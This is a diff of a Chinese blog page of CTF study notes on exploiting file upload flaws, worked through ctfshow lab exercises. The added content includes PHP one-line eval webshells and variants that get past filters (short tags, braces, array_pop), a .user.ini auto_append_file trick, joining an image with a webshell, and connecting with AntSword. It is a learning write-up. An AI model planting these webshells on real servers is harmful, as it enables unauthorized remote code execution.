@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="小迪老师文件上传, 更好的明天">
+    <meta name="keywords" content="文件上传, 更好的明天">
     <meta name="description" content="打ACM和CTF，未来的人上人，嘿嘿">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>小迪老师文件上传 | 更好的明天</title>
+    <title>文件上传 | 更好的明天</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">小迪老师文件上传</h1>
+                    <h1 class="description center-align post-title">文件上传</h1>
                 </div>
             </div>
         </div>
@@ -431,12 +431,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="/tags/ing/">
                                 <span class="chip bg-color">ing</span>
+                            </a>
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                     </div>
@@ -469,14 +469,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.6k
+                    5.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    25 分
+                    28 分
                 </div>
                 
 
@@ -509,12 +509,10 @@
 <li>尝试网站的应用</li>
 </ol>
 <h2 id="利用类型"><a href="#利用类型" class="headerlink" title="利用类型"></a>利用类型</h2><h3 id="常规类"><a href="#常规类" class="headerlink" title="常规类"></a>常规类</h3><h4 id="扫描获取上传"><a href="#扫描获取上传" class="headerlink" title="扫描获取上传"></a>扫描获取上传</h4><ol>
-<li>扫描到敏感目录，上传地址</li>
+<li>扫描到敏感目录，上传地址<h4 id="会员中心上传"><a href="#会员中心上传" class="headerlink" title="会员中心上传"></a>会员中心上传</h4><h4 id="后台系统上传"><a href="#后台系统上传" class="headerlink" title="后台系统上传"></a>后台系统上传</h4><h4 id="各种途径上传"><a href="#各种途径上传" class="headerlink" title="各种途径上传"></a>各种途径上传</h4><h3 id="CMS类"><a href="#CMS类" class="headerlink" title="CMS类"></a>CMS类</h3></li>
+<li>一般的文件上传不允许上传脚本格式的<h3 id="编辑器类"><a href="#编辑器类" class="headerlink" title="编辑器类"></a>编辑器类</h3></li>
 </ol>
-<h4 id="会员中心上传"><a href="#会员中心上传" class="headerlink" title="会员中心上传"></a>会员中心上传</h4><h4 id="后台系统上传"><a href="#后台系统上传" class="headerlink" title="后台系统上传"></a>后台系统上传</h4><h4 id="各种途径上传"><a href="#各种途径上传" class="headerlink" title="各种途径上传"></a>各种途径上传</h4><h3 id="CMS类"><a href="#CMS类" class="headerlink" title="CMS类"></a>CMS类</h3><ol>
-<li>一般的文件上传不允许上传脚本格式的</li>
-</ol>
-<h3 id="编辑器类"><a href="#编辑器类" class="headerlink" title="编辑器类"></a>编辑器类</h3><h3 id="其他类-CVE"><a href="#其他类-CVE" class="headerlink" title="其他类/CVE"></a>其他类/CVE</h3><h3 id="配合解析漏洞下的文件类型后门测试3938"><a href="#配合解析漏洞下的文件类型后门测试3938" class="headerlink" title="配合解析漏洞下的文件类型后门测试3938"></a>配合解析漏洞下的文件类型后门测试3938</h3><ol>
+<h3 id="其他类-CVE"><a href="#其他类-CVE" class="headerlink" title="其他类/CVE"></a>其他类/CVE</h3><h3 id="配合解析漏洞下的文件类型后门测试3938"><a href="#配合解析漏洞下的文件类型后门测试3938" class="headerlink" title="配合解析漏洞下的文件类型后门测试3938"></a>配合解析漏洞下的文件类型后门测试3938</h3><ol>
 <li>假设上传了一个木马含在图片里的文件,直接访问上传路径解析不出来，按理来说应该解析图片的同时应该解析出phpinfo()的脚本函数，但是没有<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713182905.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713183140.png"></li>
 <li>在上传路径后面加上/1.php   (文件的名字不重要，重要的是文件类型是php)<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713182720.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716084818.png"></li>
 <li>解析漏洞是看搭建的平台的，例如apache和nginx的</li>
@@ -872,7 +870,9 @@ Office2007对应的值:
 相对于Office2003是这样的
 Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ol>
-<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><ol>
+<h2 id="最常用的马"><a href="#最常用的马" class="headerlink" title="最常用的马"></a>最常用的马</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo(); @eval($_POST[&#39;shell&#39;]); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ol>
+<li>这样写的目的是有phpinfo()的回显，如果显示了<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717003904.png">的回显，则为能够解析木马，否则不能解析<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3></li>
 <li>system函数用于执行外部程序，并且<strong>显示输出</strong><pre class="line-numbers language-none"><code class="language-none">system(string $command,int &amp;$return_var&#x3D;?):string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>返回值为可选的，可以省略</li>
 <li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716122452.png"></li>
@@ -885,6 +885,13 @@ Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-
 <h3 id="tac-cat"><a href="#tac-cat" class="headerlink" title="tac/cat"></a>tac/cat</h3><ol>
 <li>用来显示文件，tac是反向（向前）的顺序列出文件的内容</li>
 <li>cat是读取其后所指文件内容并将其输出到标准输出设备上</li>
+</ol>
+<h3 id="-1"><a href="#-1" class="headerlink" title="@"></a>@</h3><ol>
+<li>@是可以屏蔽函数执行过程中遇到的问题而产生的一些错误，警告信息，这样用户就看不到程序的出错信息</li>
+<li>屏蔽了出错文件的路径等信息，安全性高，但是就没有回显了，所以可以不加@来获取到更多的回显信息</li>
+</ol>
+<h3 id="array-pop"><a href="#array-pop" class="headerlink" title="array_pop()"></a>array_pop()</h3><ol>
+<li>可以接受一个post或者get传的参数,这样就可以绕过过滤掉中括号和大括号无法使用$_POST[‘shell’]的情况<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($POST));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
 <h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="js前端过滤，ctfshow"><a href="#js前端过滤，ctfshow" class="headerlink" title="js前端过滤，ctfshow"></a>js前端过滤，ctfshow</h3><ol>
 <li>查看网页源代码，查看js，发现前端过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094646.png"></li>
@@ -916,12 +923,50 @@ Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-
 <li>抓个包，首先看看是不是文件名后缀的问题，<strong>大写一个字母</strong>，例如phP，发现还是被过滤掉了</li>
 <li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115845.png">，<strong>修改文件的Content-type</strong>,和前端所要求的文件类型一致，为image/png<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716120958.png">,就可以上传成功了<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716121004.png"></li>
 </ol>
+<h5 id="方法2：用蚁剑去连接"><a href="#方法2：用蚁剑去连接" class="headerlink" title="方法2：用蚁剑去连接"></a>方法2：用蚁剑去连接</h5><ol>
+<li>绕过前端js过滤，后端改包之后能够上传</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004035.png"></li>
+<li>用蚁剑去连接，右键点击添加数据，url里面填url加上上传马的路径（马所在的位置），密码为post传的参数，即shell<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004227.png">，如果出现连接成功则为ok</li>
+<li>在上传文件管理器中单机右键，选择在此处打开终端<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004350.png"></li>
+<li>一级一级目录地去寻找flag，<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004304.png"></li>
+</ol>
 <h4 id="使用getimagesize-后端过滤"><a href="#使用getimagesize-后端过滤" class="headerlink" title="使用getimagesize()后端过滤"></a>使用getimagesize()后端过滤</h4><ol>
 <li>getimagesize()可以获取到图片的宽高，如果上传的不是图片文件，getimagesize()就获取不到信息，返回false，取反!getimagesize()就为true<pre class="line-numbers language-none"><code class="language-none">if(!getimagesize($_FILES[&quot;file&quot;][&quot;type_name&quot;]))&#123;
     exit();  &#x2F;&#x2F;不满足就退出
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 <li>此时可以将一个图片和一个webshell合并为一个文件<pre class="line-numbers language-none"><code class="language-none">cat image.png webshell.php&gt;image.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>也可以用010editor放到最后</li>
+</ol>
+<h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><ol>
+<li>上传.user.ini进行文件上传绕过</li>
+<li>一定注意这是一个隐藏配置文件，最前面要加点，是”.user.ini”</li>
+</ol>
+<h5 id="user-ini文件-常用配置项"><a href="#user-ini文件-常用配置项" class="headerlink" title=".user.ini文件,常用配置项"></a>.user.ini文件,常用配置项</h5><ol>
+<li>php支持基于每个目录的.ini文件配置</li>
+<li>除了主php.ini文件之外，php还会在每个目录下扫描ini文件，从被执行的php文件所在目录开始，一直上升到web根目录，（$_SERVER[‘DOCUMENT_ROOT’]所指定的），如果被执行的php文件在web根目录之外，则只扫描该目录</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011205.png"></li>
+<li>常用配置项：S<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011252.png"></li>
+<li>假设包含1.txt<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011331.png">,重命名为user.ini</li>
+</ol>
+<h3 id="对文件内容过滤"><a href="#对文件内容过滤" class="headerlink" title="对文件内容过滤"></a>对文件内容过滤</h3><h4 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h4><ol>
+<li>绕过php：短标签：<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; ?&gt;代替php标签，&lt;?&#x3D; ?&gt;标签可以直接把php的结果输出，&lt;?&#x3D; ?&gt;的结果和&lt;?php ?&gt;完全一样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>绕过空格：使用转义字符绕过’\t’;或者使用%09也是tab的URL编码，php反引号中的字符串会被当作命令执行</li>
+<li>绕过[]:使用{}即可，大括号和中括号的作用在php中等价<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717120017.png"></li>
+</ol>
+<h4 id="不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155"><a href="#不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155" class="headerlink" title="不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155"></a>不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155</h4><ol>
+<li>上传一个png文件，抓包</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717111434.png"></li>
+<li>改包，改上传文件名称为’.user.ini’,文件内容采用’auto_append_file=1.txt’;</li>
+<li>直接上传一个1.txt文件，内容为简单的一句话木马发现报错<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717111650.png"></li>
+<li>直接上传一个内容为php的，前端为png的文件内容，发现还是报错，二分法判断前和后哪里的问题，发现是后面不允许使用php字样</li>
+<li>使用短标签不适用’php’字样,发现可以上传<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112101.png"><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;@eval($_POST(&#39;shell&#39;))&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>连蚁剑，找flag即可<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112120.png"></li>
+</ol>
+<h4 id="不允许使用中括号-，ctfshow156"><a href="#不允许使用中括号-，ctfshow156" class="headerlink" title="不允许使用中括号[]，ctfshow156"></a>不允许使用中括号[]，ctfshow156</h4><ol>
+<li>直接使用大括号{}替换中括号[]<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; eval($_POST&#123;&#39;shell&#39;&#125;) ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h4 id="中括号和大括号都过滤了，ctfshow157"><a href="#中括号和大括号都过滤了，ctfshow157" class="headerlink" title="中括号和大括号都过滤了，ctfshow157"></a>中括号和大括号都过滤了，ctfshow157</h4><ol>
+<li>这个时候我们可以使用array_pop()函数,函数内部写接收的参数，参数以post或者get方式传入<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
 
                 
@@ -987,12 +1032,12 @@ Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="/tags/ing/">
                                     <span class="chip bg-color">ing</span>
+                                </a>
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                         </div>
@@ -1200,12 +1245,12 @@ Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="/tags/ing/">
                         <span class="chip bg-color">ing</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
@@ -1249,12 +1294,12 @@ Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="/tags/ing/">
                         <span class="chip bg-color">ing</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="/tags/web/">
@@ -1457,7 +1502,7 @@ Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">65.9k</span>&nbsp;字
+                class="white-color">66.7k</span>&nbsp;字
             
             
             
